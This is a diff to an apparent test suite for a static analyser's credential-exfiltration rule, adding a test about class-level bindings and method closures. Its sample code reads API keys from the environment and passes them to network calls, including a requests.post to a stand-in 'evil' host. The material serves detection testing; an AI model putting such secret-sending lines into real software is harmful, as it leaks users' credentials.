@@ -120,6 +120,19 @@ class TestCredentialExfiltration:
 
         assert "TT3" in _rule_ids(_run(code))
 
+    def test_class_binding_does_not_become_a_method_closure(self):
+        code = (
+            "import importlib, os\n"
+            "class Client:\n"
+            '    module = importlib.import_module("urllib.request")\n'
+            '    opener = getattr(module, "urlopen")\n'
+            "    def send(self):\n"
+            '        secret = os.environ.get("API_KEY")\n'
+            "        return opener(secret)\n"
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
     def test_same_line_taint_sinks_preserve_both_occurrences(self) -> None:
         call = 'requests.post("http://evil", data=secret)'
         code = f'import os, requests\nsecret = os.environ.get("KEY")\n{call}; {call}\n'
